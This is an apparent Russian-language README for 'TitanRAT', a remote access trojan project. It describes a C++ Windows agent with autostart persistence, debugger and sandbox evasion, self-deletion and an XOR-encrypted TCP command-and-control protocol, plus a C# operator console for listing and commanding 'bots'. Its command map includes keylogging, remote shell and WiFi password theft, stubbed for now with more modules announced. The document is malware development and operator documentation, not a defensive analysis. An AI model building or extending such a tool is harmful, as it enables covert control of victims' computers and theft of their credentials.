```markdown
# 🛡️ TitanRAT — Stage 1 Core

Микроядро агента удалённого управления. Технический стек: C++ (Win32 API), TCP/XOR C2-протокол, консольный сервер на C# (.NET 8).

## 📦 Архитектура
```
Project Root/
├── Core/
│   ├── main.cpp              # Точка входа, мьютекс, CLI, инициализация
│   ├── persistence.cpp/h     # Автозапуск (Task Scheduler, HKCU Run, Startup Fallback)
│   ├── anti_debug.cpp/h      # Детект отладки (IsDebuggerPresent, rdtsc, ProcessDebugPort)
│   ├── network.cpp/h         # TCP клиент, XOR шифрование, heartbeat, регистрация
│   ├── commands.cpp/h        # Диспетчер команд, заглушки модулей, self-destruct
│   ├── config.json           # Конфиг подключения (C2 IP/Port, heartbeat interval)
│   └── build.ps1             # PowerShell скрипт сборки (MSVC/MinGW)
└── Server/
    ├── Program.cs            # Асинхронный TCP сервер, консоль оператора
    ├── ClientSession.cs      # Управление сессией, потоковое чтение XOR
    ├── XorCrypto.cs          # Шифрование/дешифрование (ключ 0xAA)
    └── Server.csproj         # .NET 8 проект
```

## 🛠 Сборка
```powershell
# В папке Core:
.\build.ps1
# Результат: core.exe (~250 KB, stripped)
```
> **Требования:** Visual Studio 2022 Build Tools (Developer Command Prompt) или `g++` (MinGW) в системном `PATH`.

## 📡 Протокол C2
| Параметр | Значение |
|----------|----------|
| **Транспорт** | TCP, порт `12345` (по умолчанию) |
| **Шифрование** | XOR `0xAA` (потоковый, применяется ко всем байтам, включая `\n`) |
| **Handshake** | `HELLO` → `ACK` → `REGISTER:<host>` → `ID:<uuid>` |
| **Heartbeat** | `BEAT:<id>` каждые `N` сек → сервер отвечает `ping` → агент `pong` |

## 🗺 Карта команд (Stage 1)

| Команда | Статус | Описание | Ответ агента |
|:--------|:------:|:---------|:-------------|
| `ping` | ✅ | Проверка связи | `pong` |
| `info` | ✅ | Хостнейм + версия ОС | `hostname=...; os=Windows 11 Build ...` |
| `uninstall` | ✅ | Самоудаление + очистка | *(агент завершает работу)* |
| `screenshot` | 🟡 | Захват экрана | `SCREENSHOT_DISABLED` |
| `keylog_*` | 🟡 | Логгер клавиатуры | `KEYLOG_DISABLED` |
| `shell` | 🟡 | CMD оболочка | `SHELL_DISABLED` |
| `steal_wifi` | 🟡 | Экспорт WiFi паролей | `STEAL_DISABLED` |
| `load_module` | 🟡 | Подгрузка модуля | `LOAD_MODULE_DISABLED` |

> 💡 **Примечание:** Все команды регистронезависимы. Неизвестные команды возвращают `UNKNOWN_COMMAND`. При детекте отладки агент переходит в `SLEEP_MODE` (30 мин) и отвечает `SLEEP_MODE` на любые запросы.

## 🖥 Операторский гайд

Все команды вводятся в консоль запущенного сервера (`dotnet run` в папке `Server/`).

### 1️⃣ Получить список ботов
```text
list
```
**Вывод:**
```text
[Connected Bots]
ID                                   Hostname             Last Seen
----------------------------------------------------------------------
1c130ef4-af8e-47ec-bb66-dcfef0ab51c2 EFOX_DARKYK          18:21:26
```
📋 Скопируйте `ID` для отправки целевых команд.

### 2️⃣ Отправить команду конкретному боту
```text
send <ID> <COMMAND>
```
**Пример:**
```text
send 1c130ef4-af8e-47ec-bb66-dcfef0ab51c2 info
```
**Ожидаемый ответ сервера:**
```text
[>] Sending to 1c130ef4-af8e-47ec-bb66-dcfef0ab51c2: info
[RESPONSE] 1c130ef4-af8e-47ec-bb66-dcfef0ab51c2: hostname=EFOX_DARKYK; os=Windows 11 Build 26200
```

### 3️⃣ Массовая рассылка
```text
broadcast ping
```
Отправит команду всем активным сессиям одновременно.

### 4️⃣ Завершение работы сервера
```text
quit
```
Корректно закроет все соединения и завершит процесс.

## ⚠️ Важные нюансы
1. **Heartbeat:** Сервер автоматически отправляет `ping` для поддержания TCP-соединения. Ответ на пользовательскую команду может прийти с задержкой `1–10 сек` (зависит от `heartbeat_interval` в `config.json`).
2. **Uninstall:** Удаление ключа реестра работает под правами пользователя. Удаление задачи из Планировщика требует прав **Администратора**. Файл `core.exe` удаляется автоматически через 2–3 секунды после завершения процесса.
3. **Anti-Debug:** При обнаружении отладчика (`x64dbg`, `WinDbg`, `OllyDbg` и др.) агент блокирует выполнение команд на **30 минут** и пишет в DebugView: `Debugger/sandbox detected`.
4. **Тестирование:** `config.json` по умолчанию настроен на `127.0.0.1:12345`. Для работы в локальной сети измените `c2_ip` на реальный адрес C2-сервера.

---
*Stage 1: Complete ✅ | Stage 2: Modules (Exec, FileMgr, ProcMgr) — in progress*
```
